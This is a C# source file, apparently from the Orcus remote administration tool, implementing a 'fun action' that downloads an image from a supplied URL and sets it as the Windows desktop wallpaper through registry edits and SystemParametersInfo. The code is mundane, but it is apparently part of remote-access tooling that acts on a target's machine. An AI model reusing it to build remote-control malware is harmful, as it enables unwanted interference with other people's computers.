using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using Orcus.Shared.Commands.FunActions;

namespace Orcus.Commands.FunActions
{
    internal class DesktopWallpaper
    {
        // ReSharper disable InconsistentNaming
        private const int SPI_SETDESKWALLPAPER = 20;
        private const int SPIF_UPDATEINIFILE = 0x01;
        private const int SPIF_SENDWININICHANGE = 0x02;
        // ReSharper restore InconsistentNaming

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        public static void Set(string url, DesktopWallpaperStyle style)
        {
            var s = new WebClient().OpenRead(url);

            var img = System.Drawing.Image.FromStream(s);
            var tempPath = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");
            img.Save(tempPath, System.Drawing.Imaging.ImageFormat.Bmp);

            var key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            if (style == DesktopWallpaperStyle.Stretched)
            {
                key.SetValue(@"WallpaperStyle", 2.ToString());
                key.SetValue(@"TileWallpaper", 0.ToString());
            }

            if (style == DesktopWallpaperStyle.Centered)
            {
                key.SetValue(@"WallpaperStyle", 1.ToString());
                key.SetValue(@"TileWallpaper", 0.ToString());
            }

            if (style == DesktopWallpaperStyle.Tiled)
            {
                key.SetValue(@"WallpaperStyle", 1.ToString());
                key.SetValue(@"TileWallpaper", 1.ToString());
            }

            SystemParametersInfo(SPI_SETDESKWALLPAPER,
                0,
                tempPath,
                SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
    }
}